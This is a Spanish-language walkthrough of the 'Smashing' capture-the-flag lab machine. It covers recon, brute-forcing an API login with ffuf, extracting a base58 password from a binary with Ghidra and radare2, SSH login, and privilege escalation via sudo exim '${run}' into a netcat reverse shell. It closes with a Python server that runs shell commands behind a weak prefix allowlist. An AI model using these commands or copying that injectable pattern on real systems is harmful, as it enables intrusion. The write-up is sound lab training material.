![Screenshot](/hard/Smashing/Images/machine.png)

Dificultad: **Dificil**

Hecho por: **Darksblack**

---
# Pasos para comprometer la máquina 🥽:
* 👁️  [Reconocimiento](#reconocimiento)
* 🔍 [Enumeración](#enumeración)
* 🪓 [Explotación](#explotación)
* 🚩 [Escalada de Privilegios](#escalada-de-privilegios)

---
## 🛠️ Técnicas: Enumeración con Gobuster, ataque a una API, fuerza bruta con Ffuf, Enumerar subdominios, Descargar archivos, Analizar un binario con Ghidra y Radare2, Manipular el binario con Radare2, Ingresar con ssh, User pivoting por privilegio de sudoer en el binario exim, Analizar codigo de python, Port forwarding con chisel, RCE bypasseando un "waf" y crear una reverse shell.
---

En primer lugar, asegurémonos de que la máquina esté activa; podemos verificarlo con el comando **ping**.

```ruby
┌──(craft㉿kali)-[~/…/dockerlabs/dificil/smashing/enumeration]
└─$ ping 172.17.0.2 
PING 172.17.0.2 (172.17.0.2) 56(84) bytes of data.
64 bytes from 172.17.0.2: icmp_seq=1 ttl=64 time=0.230 ms
64 bytes from 172.17.0.2: icmp_seq=2 ttl=64 time=0.136 ms
64 bytes from 172.17.0.2: icmp_seq=3 ttl=64 time=0.136 ms
^C
--- 172.17.0.2 ping statistics ---
3 packets transmitted, 3 received, 0% packet loss, time 2041ms
rtt min/avg/max/mdev = 0.136/0.167/0.230/0.044 ms
```

Ahora, podemos comenzar nuestra fase de **reconocimiento**.

---
# Reconocimiento

Para iniciar nuestra fase de reconocimiento, usamos **nmap** para saber qué puertos están abiertos en el objetivo.

```ruby
┌──(craft㉿kali)-[~/…/dockerlabs/dificil/smashing/enumeration]
└─$ nmap -p- -n -sS --min-rate 5000 -Pn -vv --open 172.17.0.2
Starting Nmap 7.99 ( https://nmap.org ) at 2026-06-26 15:53 -0500
Initiating ARP Ping Scan at 15:53
Scanning 172.17.0.2 [1 port]
Completed ARP Ping Scan at 15:53, 0.10s elapsed (1 total hosts)
Initiating SYN Stealth Scan at 15:53
Scanning 172.17.0.2 [65535 ports]
Discovered open port 22/tcp on 172.17.0.2
Discovered open port 80/tcp on 172.17.0.2
Completed SYN Stealth Scan at 15:53, 2.66s elapsed (65535 total ports)
Nmap scan report for 172.17.0.2
Host is up, received arp-response (0.000023s latency).
Scanned at 2026-06-26 15:53:33 -05 for 3s
Not shown: 65533 closed tcp ports (reset)
PORT   STATE SERVICE REASON
22/tcp open  ssh     syn-ack ttl 64
80/tcp open  http    syn-ack ttl 64
MAC Address: 3A:47:B4:42:26:09 (Unknown)

Read data files from: /usr/share/nmap
Nmap done: 1 IP address (1 host up) scanned in 2.98 seconds
           Raw packets sent: 65536 (2.884MB) | Rcvd: 65536 (2.621MB)           Raw packets sent: 65536 (2.884MB) | Rcvd: 65536 (2.621MB)
```

| Argumento      | Descripción                                                                                                                                                                           |
| --------------- | ------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- |
| -p-             | <- Con este argumento le decimos a nmap que escanee todos los puertos, desde el puerto 1 hasta el puerto 65,535.                                                                       |
| -n              | Con este argumento nmap omitirá la resolución DNS, esto es porque a veces en nuestros escaneos esto puede ser muy lento en algunos casos.                                             |
| -sS             | Con este argumento nmap realizará un escaneo sigiloso (stealth), lo que significa que el handshake de tres vías no se completará, y también hará el escaneo ligeramente más rápido.                      |
| --min-rate 5000 | <- Con este argumento nmap enviará al menos 5000 paquetes por segundo, haciendo el escaneo aún más rápido.                                                                            |
| -Pn             | Con este argumento nmap también omitirá la fase de descubrimiento de hosts, lo que significa que nmap tratará a la máquina como activa y realizará el escaneo inmediatamente.                                   |
| -vv             | Con este argumento nmap nos mostrará los puertos abiertos descubiertos mientras el escaneo continúa, lo que significa que si nmap descubre un puerto abierto, nos lo reportará de inmediato a medida que avanza el escaneo. |
| --open          | Con este argumento le decimos a nmap que filtre solo los puertos abiertos.<br>                                                                                                          |

Una vez que concluye el escaneo, podemos ver 2 puertos abiertos:

- puerto 22 (ssh / Secure Shell)
- puerto 80 (http / Hyper-Text Transfer Protocol)

Para saber más sobre estos puertos, como qué servicios y versiones se están ejecutando, podemos usar nmap una vez más para ello.

```ruby
┌──(craft㉿kali)-[~/…/dockerlabs/dificil/smashing/enumeration]
└─$ nmap -p22,80 -Pn -n -sCV 172.17.0.2 -oX target.xml
```

| Argumento      | Descripción                                                                                                                                                                                                                     |
| -------------- | ------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- |
| -p22,80        | Con este argumento nmap solo escaneará estos 2 puertos que descubrimos antes.                                                                                                                                                   |
| -sCV           | Con este argumento nmap escaneará la versión de cada puerto para encontrar posibles vulnerabilidades sobre sistemas desactualizados, y también realizará un escaneo con algunos scripts que ejecutan nmap, para encontrar más sobre estos puertos. |
| -oX target.xml | Con este argumento guardamos toda la salida que nmap nos da y la guardamos como un archivo xml.<br>                                                                                                                                      |

Después de que termine el escaneo, usemos **xsltproc** para convertir este archivo xml a un archivo html, para ver el resultado del escaneo de una manera más legible y agradable a la vista.

```r
┌──(craft㉿kali)-[~/…/dockerlabs/dificil/smashing/enumeration]
└─$ xsltproc target.xml -o target.html && rm target.xml
```

Y después de hacer esto, podemos abrir nuestro navegador para ver el archivo html.

```r
┌──(craft㉿kali)-[~/…/dockerlabs/dificil/smashing/enumeration]
└─$ open target.html
```

Y podemos ver la siguiente imagen:

![Screenshot](/hard/Smashing/Images/Image1.png)

Podemos ver que es más bonito y legible a la vista.

Podemos notar que intentan redirigir a **cybersec.dl**, así que esto es alojamiento virtual (virtual hosting), por lo que necesitamos poner la dirección IP de la máquina objetivo y el dominio en **/etc/hosts** en la misma línea, algo así:

```r
┌──(craft㉿kali)-[~/…/dockerlabs/dificil/smashing/enumeration]
└─$ head -n 1 /etc/hosts
172.17.0.2      cybersec.dl
```

Con este comando solo queremos ver la primera línea del archivo /etc/hosts.

Ahora, usemos el comando **whatweb** para ver qué tecnologías y versiones está usando el sitio web.

```r
┌──(craft㉿kali)-[~/…/dockerlabs/dificil/smashing/enumeration]
└─$ whatweb http://cybersec.dl
http://cybersec.dl [200 OK] Country[RESERVED][ZZ], HTML5, HTTPServer[Werkzeug/2.2.2 Python/3.11.2], IP[172.17.0.2], Python[3.11.2], Script, Title[CyberSec Corp], Werkzeug[2.2.2]
```

Podemos ver que el sitio web está usando Python, así que en Python podemos intentar un ataque que es SSTI (Inyección de Plantillas del Lado del Servidor) que funciona en Python, Node, Java, etc.

Así que vale la pena intentar realizar este tipo de ataque en este sitio web si podemos ver la salida de nuestra entrada en el sitio web.

Ahora, veamos el sitio web, pero antes de hacerlo, mi método es siempre abrir un proxy interceptor, ¿de qué estoy hablando? Me refiero a usar **Burpsuite** o **Caido** para ver el tráfico del cliente y del servidor del sitio web, en mi caso uso **Caido**.

Basta de charla, abramos el sitio web en nuestro navegador.

![Screenshot](/hard/Smashing/Images/Image2.png)

Podemos ver esta parte de contacto, pero no hace nada, e incluso los botones son inútiles, pero si miramos nuestro proxy y podemos ver esto:

![Screenshot](/hard/Smashing/Images/Image3.png)

Podemos ver que a cierto intervalo de tiempo, hace una solicitud GET a la API del sitio web para obtener una contraseña, y podemos verla en el sitio web, así que intentemos enumerar la API con **Gobuster**.

---
# Enumeración

```r
┌──(craft㉿kali)-[~/…/dockerlabs/dificil/smashing/enumeration]
└─$ gobuster dir -u http://cybersec.dl/api -w /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt 
===============================================================
Gobuster v3.8.2
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://cybersec.dl/api
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.8.2
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
login                (Status: 405) [Size: 153]
Progress: 290 / 220559 (0.13%)^C
```

| Argumento | Descripción                                                                                       |
| -------- | ------------------------------------------------------------------------------------------------- |
| dir      | Con este parámetro queremos enumerar directorios del sitio web y archivos si queremos.      |
| -u       | Con este argumento damos la URL del sitio web que queremos atacar.                         |
| -w       | Con este argumento damos una lista de palabras a gobuster para intentar buscar posibles directorios o archivos. |

Después de que termine, podemos ver un resultado, **login**, así que intentemos usar **curl** para ver más detalles.

```r
┌──(craft㉿kali)-[~/…/dockerlabs/dificil/smashing/enumeration]
└─$ curl -s http://cybersec.dl/api/login
<!doctype html>
<html lang=en>
<title>405 Method Not Allowed</title>
<h1>Method Not Allowed</h1>
<p>The method is not allowed for the requested URL.</p>
```

Y podemos ver que el método no está permitido; por defecto curl usa el método GET, para cambiarlo, podemos usar el parámetro -X para cambiar el método de la solicitud.

```r
┌──(craft㉿kali)-[~/…/dockerlabs/dificil/smashing/enumeration]
└─$ curl -s -X POST http://cybersec.dl/api/login 
<!doctype html>
<html lang=en>
<title>400 Bad Request</title>
<h1>Bad Request</h1>
<p>Did not attempt to load JSON data because the request Content-Type was not &#39;application/json&#39;.</p>
```

Podemos ver que necesita un encabezado Content-Type en application/json, así que podemos usar el parámetro **-H** para poner este encabezado.

```r
┌──(craft㉿kali)-[~/…/dockerlabs/dificil/smashing/enumeration]
└─$ curl -s -X POST http://cybersec.dl/api/login -H 'Content-Type: application/json'
<!doctype html>
<html lang=en>
<title>400 Bad Request</title>
<h1>Bad Request</h1>
<p>Failed to decode JSON object: Expecting value: line 1 column 1 (char 0)</p>
```

Okay, parece que necesita datos en un formato json, así que podemos inferir que los datos que necesita son algo como nombre de usuario y contraseña para iniciar sesión con la API.

Para hacer esto, podemos enviar los datos con el parámetro **-d**.

Así que intentémoslo.

```r
┌──(craft㉿kali)-[~/…/dockerlabs/dificil/smashing/enumeration]
└─$ curl -s -X POST http://cybersec.dl/api/login -H 'Content-Type: application/json' -d \               
> '{"username": "admin", "password": "admin"}'
{
  "message": "Invalid credentials"
}
```

Así que parece que es válido, así que podemos intentar hacer fuerza bruta con un script de Python o con ffuf, podemos usar muchas herramientas aquí para intentarlo, en mi caso lo haré con ffuf para hacer fuerza bruta a la contraseña, su tarea de casa es hacer un script de Python que haga fuerza bruta a la contraseña :p

```python
┌──(craft㉿kali)-[~/…/dockerlabs/dificil/smashing/enumeration]
└─$ ffuf -X POST -u http://cybersec.dl/api/login -H 'Content-Type: application/json' -d \
'{"username": "admin", "password": "FUZZ"}' \
-w /usr/share/wordlists/rockyou.txt -c -fc 401

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v2.1.0-dev
________________________________________________

 :: Method           : POST
 :: URL              : http://cybersec.dl/api/login
 :: Wordlist         : FUZZ: /usr/share/wordlists/rockyou.txt
 :: Header           : Content-Type: application/json
 :: Data             : {"username": "admin", "password": "FUZZ"}
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
 :: Filter           : Response status: 401
________________________________________________

undertaker              [Status: 200, Size: 650, Words: 76, Lines: 13, Duration: 129ms]
[WARN] Caught keyboard interrupt (Ctrl-C)
```

En la parte de datos **FUZZ**, **ffuf** va a reemplazar esa palabra por las palabras que están dentro del diccionario que damos en el parámetro **-w**.

| Argumento | Descripción                                                                                                                                        |
| -------- | -------------------------------------------------------------------------------------------------------------------------------------------------- |
| -c       | Con este argumento queremos que ffuf tenga colores.                                                                                              |
| -fc 401  | Con este argumento le decimos a ffuf que queremos filtrar las respuestas cuyo código de estado es 401 (forbidden).                              |
| -w       | En la parte de datos **FUZZ**, **ffuf** va a reemplazar esa palabra por las palabras que están dentro del diccionario que damos en el argumento. |

Y podemos ver el resultado **undertaker**, así que esa es la contraseña de admin.

Hagamos una solicitud con curl con estos datos.

```python
┌──(craft㉿kali)-[~/…/dockerlabs/dificil/smashing/enumeration]
└─$ curl -s -X POST http://cybersec.dl/api/login -H 'Content-Type: application/json' -d \
'{"username": "admin", "password": "undertaker"}' | jq
{
  "company": {
    "URLs_web": "cybersec.dl, bin.cybersec.dl, mail.cybersec.dl, dev.cybersec.dl, cybersec.dl/downloads, internal-api.cybersec.dl, 0internal_down.cybersec.dl, internal.cybersec.dl, cybersec.dl/documents, cybersec.dl/api/cpu, cybersec.dl/api/login",
    "address": "New York, EEUU",
    "branches": "Brazil, Curacao, Lithuania, Luxembourg, Japan, Finland",
    "customers": "ADIDAS, COCACOLA, PEPSICO, Teltonika, Toray Industries, Weg, CURALINk",
    "name": "CyberSec Corp",
    "phone": "+1322302450134200",
    "services": "Auditorias de seguridad, Pentesting, Consultoria en ciberseguridad"
  },
  "message": "Login successful"
}
```

Podemos ver muchos subdominios y posibles rutas del sitio web. Para filtrar solo las URLs podemos hacerlo con `jq`, e incluso hacer una lista con ellas.

```r
┌──(craft㉿kali)-[~/…/dockerlabs/dificil/smashing/enumeration]
└─$ curl -s -X POST http://cybersec.dl/api/login -H 'Content-Type: application/json' -d \
'{"username": "admin", "password": "undertaker"}' | jq '.company.URLs_web | split(", ")[]' -r
cybersec.dl
bin.cybersec.dl
mail.cybersec.dl
dev.cybersec.dl
cybersec.dl/downloads
internal-api.cybersec.dl
0internal_down.cybersec.dl
internal.cybersec.dl
cybersec.dl/documents
cybersec.dl/api/cpu
cybersec.dl/api/login
```

Así que solo estamos seleccionando los datos de `company.urls_web` y los datos en crudo (`-r`) para eliminar las comillas dobles, y con `split` estamos convirtiendo la coma y el espacio en una lista, y llamamos a la lista con `[]`.

Así que estoy guardando esta salida en **paths.list**.

Okay, para validar si estas URLs son válidas, funcionales o responden, guardemos los subdominios que vemos una vez más en **/etc/hosts**.

```r
┌──(craft㉿kali)-[~/…/dockerlabs/dificil/smashing/enumeration]
└─$ head -n1 /etc/hosts
172.17.0.2      cybersec.dl bin.cybersec.dl mail.cybersec.dl dev.cybersec.dl internal-api.cybersec.dl 0internal_down.cybersec.dl internal.cybersec.dl
```

Ahora veamos si estas URLs son válidas, validémoslas con ffuf una vez más.

```c
┌──(craft㉿kali)-[~/…/dockerlabs/dificil/smashing/enumeration]
└─$ ffuf -u 'http://FUZZ' -w paths.list -c

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v2.1.0-dev
________________________________________________

 :: Method           : GET
 :: URL              : http://FUZZ
 :: Wordlist         : FUZZ: /home/craft/challenges/dockerlabs/dificil/smashing/enumeration/paths.list
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
________________________________________________

bin.cybersec.dl         [Status: 302, Size: 223, Words: 18, Lines: 6, Duration: 58ms]
cybersec.dl/api/login   [Status: 405, Size: 153, Words: 16, Lines: 6, Duration: 64ms]
internal-api.cybersec.dl [Status: 302, Size: 223, Words: 18, Lines: 6, Duration: 72ms]
dev.cybersec.dl         [Status: 302, Size: 223, Words: 18, Lines: 6, Duration: 122ms]
cybersec.dl             [Status: 200, Size: 7956, Words: 2235, Lines: 206, Duration: 118ms]
internal.cybersec.dl    [Status: 302, Size: 223, Words: 18, Lines: 6, Duration: 213ms]
0internal_down.cybersec.dl [Status: 200, Size: 2631, Words: 885, Lines: 98, Duration: 214ms]
mail.cybersec.dl        [Status: 200, Size: 2909, Words: 645, Lines: 116, Duration: 259ms]
:: Progress: [11/11] :: Job [1/1] :: 0 req/sec :: Duration: [0:00:00] :: Errors: 0 ::
```

Y podemos descartar las URLs que no dieron respuesta y buscar las exitosas.

Después de mirar las que nos están redirigiendo, nuestro tráfico se está redirigiendo a **cybersec.dl**.

Así que las interesantes son **mail.cybersec.dl** y **0internal_down.cybersec.dl**.

Así que veamos la de correo web, después de un minuto analizando, es inútil, así que veamos el otro subdominio.

Y podemos ver esto:

![Screenshot](/hard/Smashing/Images/Image4.png)

Así que descarguemos estos archivos.

Y leamos la nota.

```r
┌──(craft㉿kali)-[~/…/dockerlabs/dificil/smashing/files]
└─$ cat smashing_note.txt 
De: flypsi
Para: Darksblack

Darksblack, necesito que me ayudes a recuperar mi password, te deje un binario para que lo analises y la extraigas, habia dejado mi password incorporada en el para
un CTF que estaba realizando pero perdi mis apuntes... (sisisisi ya se que me has dicho que no reutilice password, pero se me olvidan)
```

Y podemos ver que parece que la contraseña del usuario flypsi está dentro del binario, probablemente que sea **smashing**.

---
# Explotación

Así que veamos si el archivo es un archivo ejecutable.

```r
┌──(craft㉿kali)-[~/…/dockerlabs/dificil/smashing/files]
└─$ file smashing
smashing: ELF 64-bit LSB pie executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, BuildID[sha1]=3b7f42536642d56c9bf5ebcebeddc18d8336abe8, for GNU/Linux 3.2.0, not stripped
```

Y podemos ver que es un binario ejecutable de 64 bits, con bibliotecas dinámicas y no está "stripped" (sin símbolos), esto significa que los símbolos del binario contienen sus símbolos de depuración, por lo que podemos encontrar los nombres originales de las variables, funciones, etc.

Así que demos permisos de ejecución con `chmod` y ejecutémoslo para ver qué hace.

```r
┌──(craft㉿kali)-[~/…/dockerlabs/dificil/smashing/files]
└─$ chmod +x smashing
 
┌──(craft㉿kali)-[~/…/dockerlabs/dificil/smashing/files]
└─$ ./smashing 
Bienvenido al programa interactivo.
Introduce tu nombre: craft
Hola, craft

¿Te gustaría saber datos interesantes sobre ciberseguridad? (si/no): si

Datos interesantes sobre ciberseguridad:
1. La mayoría de las violaciones de datos se deben a errores humanos.
2. El phishing es uno de los métodos más comunes de ataque.
3. La ciberseguridad es una industria en rápido crecimiento, con una demanda alta de profesionales.
4. Las contraseñas más comunes son increíblemente inseguras, como '123456' y 'password'.
5. El uso de autenticación de dos factores puede aumentar significativamente la seguridad.

Medidas de ciberseguridad recomendadas para un usuario promedio:
1. Utiliza contraseñas fuertes y únicas para cada cuenta.
2. Activa la autenticación de dos factores (2FA) siempre que sea posible.
3. Mantén tu sistema operativo y software actualizado.
4. Usa un software antivirus y realiza análisis periódicos.
5. Ten cuidado con los correos electrónicos y enlaces sospechosos (phishing).
6. Evita conectarte a redes Wi-Fi públicas sin protección.
7. Realiza copias de seguridad de tus datos importantes regularmente.
8. Configura la privacidad en tus redes sociales y revisa quién puede ver tu información.
9. Usa un gestor de contraseñas para almacenar y generar contraseñas seguras.
10. Desconfía de las ofertas demasiado buenas para ser verdad.
```

Así que no hace mucho.

Hagamos algo de ingeniería inversa con **Ghidra** o **Radare2**.

Después de pasar mucho tiempo haciendo ingeniería inversa, este binario es muy confuso porque tiene muchas funciones que no se están usando y algunas son muy complejas, pero la interesante es la función `factor1`, ¿por qué? Parece que está creando una cadena, uniéndola con otra cadena, y finalmente muestra la cadena final en la pantalla, aquí está la función en pseudocódigo (ghidra):

```c
void factor1(void)

{
  long in_FS_OFFSET;
  char final_string [264];
  long local_10;
  
  <SNIP>
  
  local_10 = *(long *)(in_FS_OFFSET + 0x28);
  final_string[0xfd] = '\0';
  final_string[0xfe] = '\0';
  final_string[0xff] = '\0';
  strcat(final_string,a1209);
                    /* a1209 = DAT_00103427; "2tP" */
  strcat(final_string,b1210);
                    /* b1210 = DAT_0010342b; "42" */
  strcat(final_string,c1211);
                    /* c1211 = DAT_0010342e; "bS" */
  strcat(final_string,d1212);
                    /* d1212 = DAT_00103431; "zBTn" */
  strcat(final_string,e1213);
                    /* e1213 = s_mEAuA_00103436; "mEAuA" */
  strcat(final_string,f1214);
                    /* f1214 = DAT_0010343c; "Gk" */
  strcat(final_string,g1215);
                    /* g1215 = DAT_0010343f; "xj3" */
  printf("info: %s\n",final_string);
  if (local_10 != *(long *)(in_FS_OFFSET + 0x28)) {
                    /* WARNING: Subroutine does not return */
    __stack_chk_fail();
  }
  return;
}
```

Podemos ver algunos comentarios, que puse para explicarlos, voy a mostrar una imagen:

![Screenshot](/hard/Smashing/Images/Image5.png)

Así que las cajas (por ejemplo a1209) nos están redirigiendo a DAT_XXX...

Si no conoces esas "variables" llamadas DAT, es básicamente datos encontrados que Ghidra detecta que no son código, así que podrían ser Int (números), str (cadenas), etc.

Después de la parte DAT está la dirección, por ejemplo **DAT_00103427**, así que Ghidra nos está diciendo que existe DATOS en la DIRECCIÓN 0x00103427.

Okay, ahora expliquemos la función **strcat**, esta función va a "unir" dos cadenas, a la 1ª cadena, por ejemplo algo como:

```c
void main(void)
{
	char string1[10];
	char string2[10];
	
	string1 = "Hello ";
	string2 = "World!";
	
	strcat(string1, string2); // "Hello " + "World!"
	
	printf("%s", string1); // Output: "Hello World!"
	
	return 0;
}
```

Y strcat solo acepta cadenas, no acepta otro tipo de datos.

Así que en resumen estamos construyendo una cadena en la función **factor1**: "2tP42bSzBTnmEAuAGkxj3".

Para ver si es verdad, podemos modificar la instrucción de ensamblaje del binario **smashing** para llamar a la función `factor1` en lugar de `factor2`, podemos hacerlo con **Radare2**.

Pero primero hagamos una copia del binario por si lo estropeamos.

```r
┌──(craft㉿kali)-[~/…/dockerlabs/dificil/smashing/files]
└─$ cp smashing smashing.bkp
```

Okay, ahora abramos el binario en modo escritura y analicemos todo el binario.

```r
┌──(craft㉿kali)-[~/…/dockerlabs/dificil/smashing/files]
└─$ r2 -w -c 'aaa' smashing
```

| Argumento | Descripción                                                           |
| -------- | --------------------------------------------------------------------- |
| -w       | Activa el modo de escritura                                              |
| -c 'aaa' | Ejecuta un comando: Analiza todo el binario, funciones, variables, etc. |

Ahora desensamblemos la función main.

```r
[0x000011d0]> pdf@main
```

Con pdf (Print Disassemble Function) vamos a ver las instrucciones de ensamblaje de la función main.

![Screenshot](/hard/Smashing/Images/Image6.png)

Okay, podemos ver la instrucción y también la dirección de esa instrucción, necesitamos cambiar nuestro puntero a esa dirección.

```r
[0x000011d0]> s 0x000023dc
[0x000023dc]>
```

Con `s`, podemos cambiar la dirección de nuestro puntero.

Ahora modifiquemos la instrucción de ensamblaje.

```r
[0x000023dc]> wa call sym.factor1
INFO: Written 5 byte(s) (call sym.factor1) = wx e8c6fcffff @ 0x000023dc
```

`wa` significa write assembly, así que ahora reemplazamos `factor2` por `factor1`, ahora salgamos de radare y ejecutemos el binario una vez más.

```r
┌──(craft㉿kali)-[~/…/dockerlabs/dificil/smashing/files]
└─$ ./smashing
Bienvenido al programa interactivo.
info: 2tP42bSzBTnmEAuAGkxj3
¿Te gustaría saber datos interesantes sobre ciberseguridad? (si/no):
```

Y podemos ver la misma cadena, así que ahora descodifiquémosla.

Después de probar múltiples cifrados y codificadores, encontré que esta cadena está en base58, así que descodifiquémosla.

```r
┌──(craft㉿kali)-[~/…/dockerlabs/dificil/smashing/files]
└─$ echo "2tP42bSzBTnmEAuAGkxj3" | base58 -d
Chocolate.1704
```

Si no entiendes lo que hicimos, hice una animación para entender todo lo que hicimos con el binario.

https://github.com/user-attachments/assets/b3448005-cba8-4e27-bf8c-f7dc1c4a824e

Y podemos ver una posible contraseña, quizás podemos hacer fuerza bruta con los usuarios que obtuvimos antes (darksblack, flypsi) e iniciar sesión en ssh.

Después de probar muchas cosas, el usuario correcto para iniciar sesión con ssh es `flipsy`, no sé por qué es de esta manera, probablemente un error tipográfico o algo así.

```r
┌──(craft㉿kali)-[~/…/dockerlabs/dificil/smashing/files]
└─$ ssh flipsy@172.17.0.2 
The authenticity of host '172.17.0.2 (172.17.0.2)' can't be established.
ED25519 key fingerprint is: SHA256:KKC0BvIX7ivcjsD0MILwRiAwIJUwbagOYTaWqrNaLd8
This key is not known by any other names.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '172.17.0.2' (ED25519) to the list of known hosts.
flipsy@172.17.0.2's password: 
Linux dockerlabs 6.19.14+kali-amd64 #1 SMP PREEMPT_DYNAMIC Kali 6.19.14-1+kali1 (2026-05-05) x86_64

The programs included with the Debian GNU/Linux system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
permitted by applicable law.
$
```

Y hemos iniciado sesión con éxito como el usuario `flipsy`.

---
# Escalada de Privilegios

Veamos si tenemos privilegios de sudoers.

```r
$ sudo -l
Matching Defaults entries for flipsy on dockerlabs:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin, use_pty

User flipsy may run the following commands on dockerlabs:
    (darksblack) NOPASSWD: /usr/sbin/exim
```

Y podemos ejecutar como el usuario **darksblack** el comando **exim**.

Así que exim básicamente es una herramienta para administrar correos electrónicos en el sistema.

Con exim podemos ejecutar comandos, con `-be`, ¿qué hace? Ejecuta exim en modo de prueba y ejecuta un elemento de expansión ($run) y nos muestra la salida del comando ejecutado.

Probemos ejecutar un comando:

```r
$ sudo -u darksblack exim -be '${run{/bin/whoami}}'
darksblack
```

Así que ahora podemos ejecutar comandos, hagamos una reverse shell.

En nuestro lado ejecutemos **netcat** para recibir la conexión de la reverse shell.

```r
┌──(craft㉿kali)-[~/…/dockerlabs/dificil/smashing/files]
└─$ nc -lvnp 1234
listening on [any] 1234 ..
```

| Argumento | Descripción                                                                                                    |
| -------- | -------------------------------------------------------------------------------------------------------------- |
| -l       | Este argumento hace que netcat esté en modo de escucha.                                                         |
| -v       | Este argumento activa el modo **verbose**, esto nos mostrará con más detalle la conexión que recibimos. |
| -n       | Esto hace que netcat omita la búsqueda DNS, y solo use la dirección IP directamente.                            |
| -p       | El puerto en el que estamos escuchando, puede ser cualquier, si no se está utilizando actualmente.                                    |

Ahora ejecutemos la reverse shell.

```r
$ sudo -u darksblack exim -be '${run{/usr/bin/nc 172.17.0.1 1234 -e /bin/sh}}'
```

Así que estamos usando el binario netcat de la máquina objetivo para conectarnos con una shell sh.

Y recibimos esto:

```r
┌──(craft㉿kali)-[~/…/dockerlabs/dificil/smashing/files]
└─$ nc -lvnp 1234
listening on [any] 1234 ...
connect to [172.17.0.1] from (UNKNOWN) [172.17.0.2] 57482
whoami
darksblack
id
uid=1000(darksblack) gid=1000(darksblack) groups=1000(darksblack),100(users),1002(cyber)
```

Ahora hagamos un tratamiento de esta terminal fea.

Primero hacemos esto:

```r
script /dev/null -c sh
script /dev/null -c sh
Script started, output log file is '/dev/null'.
```

Este comando hace una nueva sesión sh con **script** y **/dev/null** como archivo de salida, porque script registra cada comando que ejecutamos en un log, pero con la ruta /dev/null, hacemos que ese log no pueda registrar comandos, y `-c sh` hace que script ejecute la shell con sh.

Hacemos esto porque queremos usar CTRL + C y más funciones de sh.

Cuando ejecutamos esto, suspendemos nuestra reverse shell por un momento con CTRL + Z.

luego ejecutamos el siguiente comando en nuestra máquina de ataque:

```r
┌──(craft㉿kali)-[~/…/dockerlabs/dificil/smashing/files]
└─$ stty raw -echo; fg
```

Este comando hace que stty trate la terminal.

| Argumento | Descripción                                                                                          |
| -------- | ---------------------------------------------------------------------------------------------------- |
| raw      | Con raw hacemos que todos los datos de salida y entrada sean crudos.                                |
| -echo    | Con esto hacemos que si ejecutamos un comando no se imprima de nuevo en la salida.<br> |
| ; fg     | Y con esto reanudamos nuestra reverse shell de nuevo.                                                     |

Cuando ejecutamos este comando reseteamos la xterm:

```r
reset xterm
```

Esto va a resetear la terminal.

Si queremos limpiar nuestra terminal no podemos porque el término será diferente a la xterm, que tiene esta función. Podemos hacerlo de la siguiente manera para poder limpiar nuestra pantalla si se ensucia:

```r
$ export TERM=xterm-256color
```

Podemos ajustar la terminal para que sea más grande con el siguiente comando:

```r
$ stty rows {num} columns {num}
```

y finalmente ¡se ve mucho mejor!

Después de intentar escalar privilegios de múltiples formas, nuestro usuario actual (darksblack), está en el grupo de **cyber**.

```r
$ id
uid=1000(darksblack) gid=1000(darksblack) groups=1000(darksblack),100(users),1002(cyber)
```

Como podemos ver aquí, podemos intentar encontrar archivos a los que el grupo cyber tenga acceso, podemos hacerlo con el comando **find**.

```r
$ find / -group cyber 2>/dev/null  
/var/www/html/serverpi.py
```

Y encontramos este archivo python, echemos un vistazo.

```python
$ cat /var/www/html/serverpi.py
import base64; p0o = "aW1wb3J0IGh0dHAuc2VydmVy <SNIP> yIGh0dHAuc2VydmVyIGh0dHAuc2VydmVyIG"; p1tr = base64.b64decode(p0o.encode()).decode(); exec(p1tr)
```

Este codigo de python lo que hace es basicamente es decodificar la cadena en base64 y lo ejecuta con python, entonces vamos a copiar el contenido y vamos a guardarlo in nuestra propia maquina.

```r
┌──(craft㉿kali)-[~/…/dockerlabs/dificil/smashing/files]
└─$ echo "aW1wb3J0IGh0dHAuc2VydmV <SNIP> KCkK" | base64 -d > serverpi.py
```

Despues de analizar el codigo estas son las partes importantes:


```python
import http.server
import socketserver
import urllib.parse
import subprocess
import base64

PORT = 25000

AUTH_KEY_BASE64 = "MDAwMGN5YmVyc2VjX2dyb3VwX3J0XzAwMDAwMAo="

if 'exec' in query_params:
    command = query_params['exec'][0]
    try:
        allowed_commands = ['ls', 'whoami']
        if not any(command.startswith(cmd) for cmd in allowed_commands):
            self.send_response(403)
            self.send_header("Content-type", "text/plain")
            self.end_headers()
            self.wfile.write(b"Command not allowed.")
            return

        result = subprocess.check_output(command, shell=True, stderr=subprocess.STDOUT)
        self.send_response(200)
        self.send_header("Content-type", "text/plain")
        self.end_headers()
        self.wfile.write(result)
```

